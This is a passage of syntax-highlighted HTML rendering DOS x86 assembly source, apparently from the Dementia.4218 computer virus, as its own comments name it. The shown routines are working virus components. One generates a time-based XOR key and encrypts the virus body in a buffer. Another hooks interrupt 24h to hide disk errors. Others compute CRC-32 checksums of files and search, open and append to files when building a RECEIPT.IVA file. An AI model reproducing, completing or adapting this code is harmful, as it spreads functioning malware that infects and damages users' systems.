         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; BX = 16-bit random number</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">      </span><span class="sc1">; Get system date</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; BX = 16-bit random number</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; BX = decryption key</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; DX =     "       "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_key</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; Store decryption key</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move virus to data buffer</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">crypt_begin</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">; SI = offset of crypt_end</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DI =   "    "      "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_begin</span><span class="sc4">-</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">

         </span><span class="sc6">std</span><span class="sc0">             </span><span class="sc1">; Set direction flag</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = word of plain code</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Encrypt word</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store encrypted word</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int24_store</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get and set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">     </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">        </span><span class="sc1">; Get interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int24_virus</span><span class="sc4">+</span><span class="sc2">110h</span><span class="sc0"> </span><span class="sc1">; DX = offset of int24_virus + 110h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int24_load</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int24_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 24h of Dementia.4218</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Fail system call in progress</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">calc_crc32</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Calculate CRC-32 checksum</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; AX = segment of CRC-32 table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "    "      "</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
</span><span class="sc5">gen_crc_tab</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; AL = counter</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; Calculate each CRC-32 table entr...</span><span class="sc0">
</span><span class="sc5">gen_crc_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">
         </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Rotate DX through carry one bit ...</span><span class="sc0">
         </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Rotate AX through carry one bit ...</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">carry_loop</span><span class="sc0">      </span><span class="sc1">; No carry? Jump to carry_loop</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0edb8h</span><span class="sc0">       </span><span class="sc1">; DX = high-order word of CRC-32 t...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8320h</span><span class="sc0">        </span><span class="sc1">; AX = low-order word of CRC-32 ta...</span><span class="sc0">
</span><span class="sc5">carry_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gen_crc_loop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Store low-order word of CRC-32 t...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">; Store high-order word of CRC-32 ...</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; DI = offset of next CRC-32 table...</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Increase count register</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Generated enough CRC-32 table en...</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">gen_crc_tab</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to gen_crc_tab</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; DX = high-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; AX = low-order word of CRC-32 ch...</span><span class="sc0">
</span><span class="sc5">read_block</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">         </span><span class="sc1">; Read one thousand and twenty-fou...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Read all of the file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">calc_crc_xit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to calc_crc_xit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes actually read</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
</span><span class="sc5">cal_crc_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">       </span><span class="sc1">; Zero BH</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; BL = byte of file</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Exclusive OR (XOR) byte of file ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Multiply by four</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; DI = offset of next CRC-32 table...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; AL = low-order byte of low-order...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; AH = high-order byte of low-orde...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; DL = low-order byte of high-orde...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; Zero DH</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; BX = low-order word of CRC-32 ta...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; AX = low-order word of CRC-32 ch...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; BX = high-order word of CRC-32 t...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; DX = high-order word of CRC-32 c...</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cal_crc_loop</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">read_block</span><span class="sc0">
</span><span class="sc5">calc_crc_xit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; DX = high-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; AX = low-order word of CRC-32 ch...</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_recei</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Create RECEIPT.IVA file</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">      </span><span class="sc1">; Correct stack pointer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store number of file specifications</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; Store file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store store or don't store backs...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">     </span><span class="sc1">; Store segment of file specificat...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">      </span><span class="sc1">; Set current directory</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = number of file specifications</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; CL = number of file specifications</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
</span><span class="sc5">find_first_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS = segment of file specification</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000000111b</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_first</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">find_next_</span><span class="sc0">      </span><span class="sc1">; No error? Jump to find_next_</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fnd_nxt_loop</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">find_next_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">48h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of disk transfer area</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">      </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store file handle of file within...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_eof</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">44h</span><span class="sc0">
